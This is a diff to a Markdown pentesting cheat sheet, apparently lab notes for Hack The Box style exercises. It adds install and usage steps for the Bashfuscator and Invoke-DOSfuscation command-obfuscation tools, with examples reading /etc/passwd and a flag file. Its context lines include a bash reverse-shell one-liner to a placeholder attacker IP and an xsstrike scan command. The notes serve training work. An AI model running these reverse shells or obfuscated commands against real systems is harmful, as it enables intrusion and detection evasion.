@@ -40,3 +40,31 @@ python3 xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 ```bash
 bash -c 'bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1 2>&1'
 ``` 
+# Deofuscation
+## Linux
+- Download
+```bash
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+```
+- Example
+```bash
+cd ./bashfuscator/bin/
+./bashfuscator -c 'cat /etc/passwd'
+```
+## Windows
+- Download
+```bash
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+```
+- Example
+```bash
+Invoke-DOSfuscation
+SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+encoding
+1
+``` 
